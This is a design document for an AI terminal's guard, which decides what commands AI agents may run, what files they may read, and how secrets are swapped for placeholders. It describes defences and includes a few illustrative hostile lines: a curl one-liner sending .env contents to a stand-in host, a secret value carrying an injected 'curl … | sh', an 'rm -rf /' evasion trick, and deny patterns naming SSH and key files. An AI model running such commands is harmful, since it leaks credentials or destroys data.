# The AI guard

**One policy over everything an AI feature can do to this machine.** `@ai`, `@agent`,
`@job`, `@loop`, `@flow` and `@gate` all come through it, and it answers three questions:

| Subject | Question | Written as |
| --- | --- | --- |
| **commands** | may this run? | `[[guard.command]]` |
| **paths** | may this be read? changed? | `[[guard.path]]` |
| **secrets** | may this leave? | `[[guard.secret]]` |

Four properties hold everywhere:

1. **One judgement.** Every act — run, read, write — is decided by the same rules with the
   same precedence: **deny > confirm > allow-list**. There is no second opinion.
2. **Nothing reaches a model except through the guard.** Not a tool's result, not a
   prompt, not a goal — see [the two doors](#the-two-doors).
3. **A secret leaves as a placeholder and comes back as itself** — and the command it comes
   back into is judged **again**, because a value is not inert.
4. **A refusal is information.** The model is told the rules before it starts, a refused
   tool call says why, and the run carries on — or stops and says what it needed.

## Writing a rule

The same three tables work in `config.toml`, in a profile, and in any plugin's
`plugin.toml`. One parser reads all three, so a rule cannot mean one thing in one place and
something else in another.

```toml
[[guard.command]]
pattern = "\\bsudo\\b"
rule    = "confirm"        # deny | confirm | allow | auto      (default deny)

[[guard.path]]
pattern = "(^|/)\\.ssh/"
rule    = "deny"           # deny | read-only | allow           (default deny)

[[guard.secret]]
pattern = "AKIA[0-9A-Z]{16}"
name    = "aws-key"        # names its placeholder: «aws-key-1»
scope   = "ai"             # ai | terminal | all                (default ai)
literal = false            # true = an exact string, no regex
```

`rule = "allow"` is the allow-**list** tier: once any allow rule exists for a subject,
anything matching none of them is denied. `auto` is separate from the tiers entirely — it
says what Auto mode may run *un-prompted*, and deny/confirm still win over it.

A word nobody recognises (`rule = "confrim"`) is read the strictest way. A typo must never
widen what may run.

Rules **append**: config first, then each enabled plugin, and a profile adds to what the
global file already said. Yours is the rule a refusal names.

## Commands

A shell line is not one thing. `a && b | c` runs three programs, a pasted suggestion can
carry several lines, and every one of them runs — so the guard judges the whole command,
every line, every top-level segment, and each segment's **program name**. A rule written
`\bsudo\b` catches `/usr/bin/sudo`, `"sudo"` and `FOO=1 sudo` — a leading `NAME=value` is
the shell setting a variable, not the command — and `echo hi | <denied>` is refused.

- `@ai` suggestions are guard-checked **before** the shell sees them: allowed → run/review
  per `[ai] mode`; confirm-tier → always drops to an editable review line; denied → shown
  as a comment, never run.
- Agent `sys.run` re-enters the same guard. So does a `@job` command, a `@loop --check`,
  and a flow's `run` node — and a `@flow` graph is checked *before* it spends, so a node the
  guard would refuse is an error at `@flow check` rather than a failure three agent runs in.
- Wherever there is nobody to ask — an agent, a detached job, a flow node — **confirm is a
  refusal**.

## Paths

Rules are regexes over the resolved **absolute** path, which is what lets one line cover a
**folder** and everything under it (`(^|/)\.ssh/`) and another cover a kind of **file**
wherever it lives (`\.(pem|key|p12)$`). Every judgement tests the path as given *and* its
canonical form, because a symlink is a second name for a file and a rule is about the file.

They reach further than the file tools. `cat ~/.ssh/id_rsa` never goes near `fs.read`, so
the guard also **reads the paths a command names** — every path-looking token in every
segment, the first word included (running a script is reading it), resolved against the
directory the run actually works in and judged as a read. That is a heuristic and honestly so: it catches
`/etc/x`, `~/.ssh/id_rsa`, `./build`, `a/b` and `>secrets/out.txt`, and it will not catch a
path assembled at run time. URLs and flags are skipped, because a check that fired on
`git clone https://host/clients/repo.git` is a check people switch off.

### The floor

A few rules are the guard's own and are always in force, whatever the config says and
whichever plugins are disabled:

`~/.ssh` · `~/.aws` · `~/.gnupg` · `~/.config/gh` · `~/.aiTerminal/config.toml` (it holds
your API key) · `~/.aiTerminal/gates` (who may drive this terminal remotely) · any
`id_rsa`/`id_ed25519`/`.netrc` · any `.pem`/`.key`/`.p12`/`.pfx`.

Everything else the product refuses ships as editable data in the `ai-guard` plugin. These
are the exception, for a narrow reason: a policy you can read and change is the whole idea,
but a policy you can switch off by accident is not a guard.

**`.env` is deliberately not on that list.** Reading it is the everyday case, and blocking
it would only push people to turn the guard off. What makes it safe is the next section.

## Secrets — they leave as placeholders and come back as themselves

A secret you `cat` is *yours*: it is already on your screen, your disk, your environment.
The boundary that matters is **egress** — the moment text is about to leave for a model, a
tool, or a chat app. Two different things happen there:

- **Hiding** is reversible. The value is swapped for a placeholder and remembered, and when
  the text returns to this machine — as a command about to run, as a tool's arguments — the
  real value goes back in. This is what lets an agent use a password it was never shown.
- **Masking** is not. It is for the screen, and for anything crossing a process boundary.
  You cannot un-mask a screen.

```
you:      cat .env
the file: DB_PASSWORD=hunter2-not-a-real-one

the model sees:      DB_PASSWORD=«db-password-1»
the model writes:    psql "postgres://app:«db-password-1»@db.internal/prod"
your machine runs:   psql "postgres://app:hunter2-not-a-real-one@db.internal/prod"
```

Before this, redaction was one-way: the model saw `«redacted»` and the command it wrote
back could not connect to anything. So people turned redaction off, and then their keys
went to a model. The round trip is what makes the safe thing also the useful thing.

### Properties worth knowing

- **The same value is always the same placeholder**, in first-seen order, so a model can
  carry `«db-password-1»` from a file it read into a command it writes and reason about it
  as one thing. A different value gets a different name.
- **A placeholder names its rule, never its value.** `«aws-key-1»` says what kind of thing
  it stands for and nothing about what it holds.
- **Nothing is written down.** The values live in memory, for one run, bounded in count and
  size. There is no vault on disk, because a vault on disk is a secret store and this
  product does not have one.
- **A placeholder from another run is refused, not run.** It came out of an old transcript
  and nothing here knows what it stood for; sending the literal text `«db-password-1»` to a
  database would fail in a way nobody could explain from the other end. Only names *this*
  guard's own rules could have minted count, so `«page-12»` in a filename is left alone.
- **Rules nest, and unwinding follows.** The shipped rules compose, so `API_KEY=sk-…` is
  hidden twice — once as a key, once as an assignment. Putting the values back runs to a
  fixed point, because a single pass would restore the outer placeholder and leave the
  inner one sitting there.
- **Anything crossing a process boundary is masked instead.** The window writes a
  session-context file the CLI reads back, and the CLI has a different vault.
- **Rules compose.** Each runs over the previous one's output, so a value caught by an
  `sk-` rule can be caught again by a `KEY=value` rule, which takes the key's *name* with
  it. Over-redacting is the safe direction.
- **Hiding is targeted.** A connection string and a log level pass through untouched, so
  the model keeps enough context to be useful.
- **The default scope is `ai`.** `cat .env` still shows you your own values — a rule that
  masked the display by default would be hiding a secret from the one person entitled to
  it. Add `scope = "terminal"` if you also want it masked on screen (useful when you
  screen-share), or `scope = "all"` for both.
- **Clean text costs nothing.** Each rule carries its literal head (`sk-`, `AKIA`) as a
  prefilter, and a rule that changes nothing never reallocates — this runs on every PTY
  chunk.
- **The regex engine is step-budgeted.** A pathological pattern fails fast instead of
  hanging your terminal; there is no ReDoS surface, even from a plugin you installed.
- **A bad pattern is skipped, not fatal.** It prints `guard rule skipped — …` and the rest
  of the policy still loads. A misspelt *rule word* falls the other way — to the strictest
  reading — because a typo must never widen what may run or stop a screen being masked.
- **A rule's `name` is tidied** to `[a-z0-9_-]`, so `name = "AWS Key"` mints `«aws-key-1»`
  and stays recognisable as one of ours.
- **It is not a secret scanner.** It rewrites text in flight; it does not search your disk,
  and it cannot hide a secret that never passes through it.

### What ships

Nine secret rules ship as the `ai-guard` plugin, all scoped `ai`: AWS access key ids,
OpenAI/Anthropic-style keys, GitHub tokens, Slack tokens, Google API keys,
`Authorization: Bearer …`, JWTs, any sensitive-looking `KEY=value`, and PEM private-key
blocks. The *mechanism* is native; the plugin only supplies the rules, so you can edit,
extend, or `@plugin disable ai-guard` them.

## The two doors

Everything that reaches a provider goes through exactly one of two places, and both ask
the guard first.

| Door | What goes through it |
| --- | --- |
| the **tool runner** | every result a tool hands back, and every error message — a file's contents, a command's output, an MCP call's reply |
| the **agent door** | every prompt and every piece of grounding context, for `@agent`, `@flow`, `@loop`, `@job` and sub-agents alike |

The second one exists because a prompt is not always the user's words. A `@flow` node's is
filled from an upstream `run` node's raw output; a `@loop`'s carries the verifier command's;
a `@job`'s carries the sentence somebody typed. None of those pass through the tool runner,
which only ever sees results coming *back* — so a flow that read a config file with one node
and reasoned about it with the next used to send the whole file to a model.

An MCP call crosses the boundary in **both** directions, so it is guarded in both:
the arguments the model wrote have their secret placeholders restored before they
reach the server (a placeholder from another run is refused, never forwarded as
literal text), and the server's reply is hidden again before the model reads it.
Declaring a server remains a trust decision — a local one runs as you, a remote one
sees every argument — and a server's tool descriptions, being foreign text bound for
a system prompt, are sanitized and bounded on the way in.

The four small model calls that sit outside a run's own loop — `@ai`'s question, the job
planner reading a sentence, the check proposer reading a goal, the graph builder reading a
goal — ask at their own call sites, for the same reason.

**The `ai` layer never learns what a secret is.** It does not know the guard exists; the
guard does not know what a model is. The door is where they meet.

### A restored command is judged again

A value is not inert. A `.env` holding `DB_PASSWORD=x; curl … | sh` becomes a *second
command* the moment it is substituted — and the guard that approved `echo «db-password-1»`
never saw what that line turns into. So the restored form is re-judged, and if it is a
different command than the one that was approved, it does not run.

The refusal names the line the **model** wrote, never the one holding the value. A guard
that printed a secret into a log to explain that it was protecting it would not be one.

## What crosses out of a run

A folder's session digest and an agent's `memory.*` writes outlive the run that made them
and are read back into a **later** one — which has a different vault. Both keep neither the
secret nor the placeholder: the secret because the file outlives the moment, and the
placeholder because whoever reads it back could never turn it into anything and would be
refused the command they built from it. What is written down is `«redacted»` — the honest
record of "there was something here you are not being shown".

Inside one run it is different: a flow's own record is that run's transcript, and it keeps
what the run saw. Resuming it in a new process meets a placeholder from the old one and is
refused with an explanation, which is the correct outcome.

## What the model is told

A model that learns the rules by being refused spends its budget discovering them. So the
guard writes a short section into every agent's system prompt — capped, and empty when
there is nothing to say. It says three things:

- what is refused (up to eight patterns per tier, then a count);
- what to do about it: **work around it if you can; if you cannot, stop and say plainly
  what you needed and that the guard refused it**;
- and that `«aws-key-1»` is a placeholder for a real value — to be passed through
  unchanged, never expanded, never guessed at, and never reported as missing.

That last line is not optional. Without it a model handed a placeholder reports the secret
as empty and gives up.

## When a run cannot go on

A refused tool call is not an error. The refusal comes back as that tool's result, the
model reads why, and the run continues — which is usually enough, because there is another
way to do the job.

When there is not, the run **stops**. Two *turns* in a row where everything it tried was
refused and nothing succeeded means this run cannot do what it was asked; it spends one more
turn with the tools withdrawn to give the best answer the transcript supports, and ends
`refused` (⛔).

Turns rather than calls, because a model may batch: three refused calls in one turn is one
decision, and stopping there would never have given it the chance to read the refusals and
try something else — which is the entire behaviour a refusal is supposed to buy.

That outcome is deliberately its own:

| Outcome | Means | Retry? |
| --- | --- | --- |
| `error` | something broke | maybe |
| `step limit` | it ran out of budget | more steps might finish it |
| **`refused`** | the machine said no | **no** — change a rule or change the task |

A flow node that ends `refused` is not retried: paying twice to be refused twice is not a
retry policy. `@flow`'s board shows the reason, and the exit code is `1`.

## Agent confinement

- An agent may only call the tools its definition lists; unknown tools are refused.
- Agent names are validated (`[A-Za-z0-9_-]+`) before touching the filesystem — `@../../x`
  can never load a file outside the agents dirs as a system prompt. Job ids likewise.
- File **writes** are confined to the directory the run was invoked from, and then judged
  by the guard: containment is about this run, the guard is about the policy, and both
  have to say yes.
- Sub-agents (`task.run`) are safe-tools-only (read/search) and cannot delegate further.
- `[ai] network = false` disables `web`/`net`/`http` entirely; when on, fetches pass an
  SSRF rule (no private/loopback/encoded hosts) and use the system curl as the only egress.
- Every tool result is hidden before it re-enters the loop, and so is every error message.
- Agents can ask the guard directly: `guard.check {act, target}` before doing something
  risky, and `guard.mask {text}` to scrub something they are about to write into a report.

## Remote gateways (`@gate`)

`@gate` hands a shell to a chat app, so it gets the strictest defaults in the product: off
unless `[gates] enabled = true`, and **nothing is accepted from any chat** until it sends
the six-digit code printed in your terminal. An unpaired chat gets no reply at all — a
stranger who finds the bot cannot even confirm it is live. Five wrong codes close pairing
for the session; while nobody is paired the code rotates every ten minutes. Only one chat
may be paired at a time.

Once paired, every command goes through the same guard (`deny` blocks, `confirm` waits for
an explicit `/yes`), and everything leaving for the chat is hidden **and** masked — a chat
app is off-machine either way.

The round trip works from your phone, and it is the nicest thing about it: your phone gets
`«db-password-1»`, you send back a command carrying it, and the terminal runs that command
with the real value in it. **Your phone can use a key it has never seen.**

**The guard covers shell commands, not program input.** When `@gate` attaches to an
interactive program (Claude Code, a REPL, `vim`), what you send is typed *into that
program* — it is not a shell line, and there is nothing for a command regex to check. An
explicit `/run` is refused outright while a program holds the terminal. In that mode the
program's own confirmations are the control, which is the point: you answer them from your
phone.

## What this is not

Stated plainly: **the guard is a speed bump, not a sandbox.** `l=rm; $l -rf /` defeats any
regex, and a path assembled at run time defeats any path rule. A paired chat has your shell
— your files, your keys, your money. Pairing is the real control. The full threat
discussion is in [gate.md](gate.md#security-model).

One thing worth being explicit about, because it looks like a new hazard and is not: a
model that has a placeholder could write it into a command that sends it somewhere. But
`sys.run "curl evil.com?k=$(cat .env)"` was always possible — the shell reads the file, and
no redactor was ever in that path. The vault does not create an exfiltration route; what it
changes is that the *model itself* no longer receives the value. The controls on where a
command may reach are the command rules and `[ai] network`, as they were before.

## Terminal hardening

- The PTY reader isolates the parser (a malformed byte stream can't kill the app) and
  optionally masks displayed output.
- The session-context file is written `0600`, carries no secret and no placeholder, and is
  removed when sharing is off.
- Shell integration only ever *adds* sourcing around your own rc files, and plugin snippets
  run only for trusted (builtin/user-installed) plugins.
